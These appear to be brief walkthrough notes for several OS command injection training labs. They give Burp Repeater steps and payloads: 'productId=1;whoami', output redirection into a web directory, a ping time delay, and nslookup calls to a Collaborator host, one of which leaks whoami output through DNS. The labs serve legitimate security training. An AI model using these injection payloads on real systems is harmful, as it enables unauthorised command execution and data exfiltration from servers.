
**Step1:**

Click on view product and then check stock

**Step2:**

Send the POST /product/stock request to repeater


**Step3:**

Change the product id and storeId to

`productId=1;whoami&storeId=1`

And the lab is solved


**Step1:**

Go to feed back form and give a feedback

**Step2:**

Send the POST /feedback/submit to repeater

**Step3:**

Change the email to

`||whoami>/var/www/images/output.txt||`

And and send request

**Step4:**

No intercept the viewproduct and forward until filename page is not reached

Send it to repeater And replace file name with the file containing command


**Step1:**

Go to feeback form and submit any feedback

**Step2:**

Send the POST /feedback/submit to repeater

**Step3:**

Change email to

`||nslookup collaborator ud.oastify.com||`

In collaborator we have interaction

And the lab is solved

**Step1:**

Go to feeback form and submit any feedback

**Step2:**

Send the POST /feedback/submit to repeater

Send the request to repeater and Change email parameter to

`|| nslookup `whoami`.Collaborator.id ||`


In collaborator we have interaction


Submit the answer

**Step1:**

Go to feeback form and submit any feedback

**Step2:**

Send the POST /feedback/submit to repeater


**Step3:**

Change email to `|| ping -c 10 127.0.0.1||` and send request


And lab get solve
